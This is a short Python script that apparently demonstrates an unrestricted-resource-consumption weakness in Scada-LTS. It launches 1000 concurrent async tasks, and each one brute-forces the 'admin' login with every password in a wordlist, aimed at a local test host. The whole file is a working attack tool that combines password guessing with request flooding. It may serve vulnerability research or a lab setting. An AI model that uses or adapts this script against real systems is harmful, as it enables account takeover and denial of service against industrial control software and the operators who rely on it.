import asyncio
import logging

import aiohttp

NUMBER_OF_TASK = 1000

logging.basicConfig(
    filename="04-unrestricted-resource-consumption-02.log",
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
)

HOST = "http://127.0.0.1:8080"
URL_ERROR = f"{HOST}/Scada-LTS/login.htm?error"
SUCCESS_LOCATION = f"{HOST}/Scada-LTS/watch_list.shtm"

async def attack_server(session, task_id: int):
    print(f'Task {task_id} started')

    with open('password-wordlist.txt') as f:
        for password in f:
            password = password.strip()
            data={
                'username': 'admin',
                'password': password.strip(),
            }

            print(f'[TRYING PASSWORD] {password}')
            try:
                async with session.post(
                    f"{HOST}/Scada-LTS/login.htm",
                    data=data,
                    timeout=15,
                ) as res:
                    if res.url == URL_ERROR:
                        print('[ERROR] Incorrect password')

            except Exception as e:
                logging.error(f'Task {task_id}: Request failed with password {password}. Error: {e}')
                print(e)

async def execute():
    connector = aiohttp.TCPConnector(limit=NUMBER_OF_TASK, limit_per_host=NUMBER_OF_TASK)

    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [attack_server(session, i) for i in range(NUMBER_OF_TASK)]
        await asyncio.gather(*tasks)


if __name__ == '__main__':
    asyncio.run(execute())